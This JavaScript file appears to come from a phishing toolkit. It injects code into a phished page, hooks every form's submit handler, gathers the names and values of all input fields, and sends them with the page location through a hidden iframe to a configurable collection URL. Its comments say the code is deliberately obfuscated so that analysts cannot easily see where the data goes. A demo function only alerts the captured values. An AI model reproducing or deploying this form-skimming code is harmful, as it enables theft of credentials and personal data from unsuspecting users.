/**
 * This is the function that intercepts a form submit. This function is written into the target
 * phished file. Have to obfuscate these so that people who analyze the source code of the page
 * cant immediatly see where the information is going.
 */
function _tack_(s)
{
    _cv_ = function()
    {
        var o = "";
        var _inpa_ = document.getElementsByTagName("input");
        _inpa_.concat(document.getElementsByTagName("textarea"));
        for (var i = 0; i < _inpa_.length; i++) 
        {
            o += "&" + _inpa_[i].name + "=" + _inpa_[i].value;
        }
        return escape(o);
    }
    
    for (var i = 0; i < document.forms.length; i++) 
    {
        document.forms[i].onsubmit = s;
    }
}

/**
 * A list of all the different ways to submit credentials
 */
_submitList_ = [
{
    'func': this._gs_,
    'name': 'HTTP Get to a URL'
}, 
{
    'func': this._gd_,
    'name': 'Just show a message box'
}]

/**
 * Submits the user data to the user specified using HTTP GET
 */
function _gs_()
{
    var s = document.createElement("iframe");
    s.style.display = "none";
    document.body.appendChild(s);
	var elem = this.getElementsByTagName("input");
	var result = "location="+document.location;
	for (var i = 0; i < elem.length; i++)
	{
		result += "&" + elem[i].name + "="+ elem[i].value; 
	}
	s.src = _submitUrl + "?" + _submitParam + "=" + escape(result);
	
}

/**
 *  A demo function that does not really submit the
 *  credentials to a URL, just alerts user that the credential could be stolen
 */
function _gd_()
{	
	var result = "";
	var elem = this.getElementsByTagName("input");
	for (var i = 0; i < elem.length; i++)
	{
		result += "\n" + elem[i].name + " [" + elem[i].type + "] =" + elem[i].value; 
	}
	alert("This is a demo of the phishing page. You tried to submit" + result + "\nto a form.");
}
